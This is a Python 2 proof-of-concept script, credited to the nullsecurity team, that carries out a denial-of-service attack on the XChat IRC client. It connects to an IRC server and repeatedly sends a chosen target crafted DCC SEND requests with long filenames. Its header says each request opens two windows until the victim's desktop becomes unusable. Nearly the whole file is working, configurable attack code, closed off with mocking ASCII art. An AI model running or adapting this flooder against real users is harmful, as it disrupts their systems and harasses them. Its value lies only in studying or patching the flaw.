#!/usr/bin/env python
# -*- coding: latin-1 -*- ######################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ team                        #
#                                                                              #
# nixchat-bomb.py - xchat window bomb                                          #
#                                                                              #
# FILE                                                                         #
# nixchat-bomb.py                                                              #
#                                                                              #
# DATE                                                                         #
# 03-12-2013                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# This PoC floods the target with DCC SEND file requests which will result in  #
# a denial of service. The XChat client opens two new windows per request and  #
# the target will not be able to close all of them. Also, it is not possible   #
# to interact with your window manager - switch tty and kill XChat ;)          #
#                                                                              #
# AFFECTED PLATFORMS                                                           #
# - Linux                                                                      #
# - Windows                                                                    #
#                                                                              #
# AUTHOR                                                                       #
# pgt <at> nullsecurity.net                                                    #
#                                                                              #
# TWITTER                                                                      #
# @pgt_nullsec                                                                 #
# @nullsecuritynet                                                             #
#                                                                              #
################################################################################

import sys
import socket
import ssl
import time

#--] start config
SERVER = '127.0.0.1'
PORT = 6667
NICK = 'd0s1nc'
IDENT = 'l4m0r'
REALNAME = '3ng4lh4rd7'
CHAN = ''
DELAY = 1
#--] end config

# pr0bl3m 0ff1c3r?
def main():
    print '[!] connecting ...'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER, PORT))
    #s = ssl.wrap_socket(s)
    s.send ('USER %s %s %s :%s\r\n' % (NICK, IDENT, REALNAME, NICK))
    s.send ('NICK %s\r\n' % (NICK))

    df = 0

    while True:
        if df < 1:
            time.sleep(10)
            s.recv(4096)
            s.send('JOIN %s\r\n' % (CHAN))
            df = 1

        text = 'A' * 256

        # hmm y4 hmm y4?! WH444T?!?
        s.send('PRIVMSG t4rg3t :\x01DCC SEND %s 3232235872 41280 5' \
                '\x01\r\n' % (text))
        print '[+] b0mb1ng!!!1!1'
        time.sleep(DELAY)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print '░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░\n' \
                '░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░\n' \
                '░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░\n' \
                '░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░\n' \
                '░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░\n' \
                '█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█\n' \
                '█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█\n' \
                '░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░\n' \
                '░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░\n' \
                '░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░\n' \
                '░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░\n' \
                '░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░\n' \
                '░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░\n' \
                '░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░\n' \
                '░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░'
